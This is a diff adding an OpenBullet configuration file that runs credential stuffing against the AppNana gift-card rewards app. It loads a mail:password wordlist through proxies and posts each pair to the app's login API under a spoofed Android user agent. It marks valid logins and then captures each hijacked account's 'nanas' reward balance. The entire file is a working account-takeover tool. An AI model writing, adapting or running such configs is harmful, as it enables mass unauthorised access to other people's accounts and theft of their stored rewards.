@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Appnana API with Capture",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-28T13:56:49.3389098+08:00",
+  "AdditionalInfo": "For we know not then we see not(#6757)",
+  "Author": "Hans96",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://appnana2.mapiz.com/api/nanaer_login/" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  CONTENT "email=<USER>&password=<PASS>&source=Android.google-play&signkey=&android_id=a0d3c13feabd9146&version=3.5.2&gaid=&gaid_enabled=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: com.appnana.android.giftcardrewards/3.5.2 (Linux; U; Android 4.4.2; en-US; GALAXY S6 edge Build/JDQ39; samsung) 1080X1920 samsung GALAXY S6 edge" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\"errstr\":\"SUCCESS\"" 
+  KEYCHAIN Failure AND 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "\"errstr\":\"invalid login\"" 
+
+REQUEST GET "https://appnana2.mapiz.com/api/get_nanaer_info/?email=<USER>" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: User-Agent: com.appnana.android.giftcardrewards/3.5.2 (Linux; U; Android 4.4.2; en-US; GALAXY S6 edge Build/JDQ39; samsung) 1080X1920 samsung GALAXY S6 edge" 
+  HEADER "Accept: application/json; version=1.2" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"nanas\":0" 
+
+PARSE "<SOURCE>" LR "\"nanas\":" "," CreateEmpty=FALSE -> CAP "Nanas:" 
+
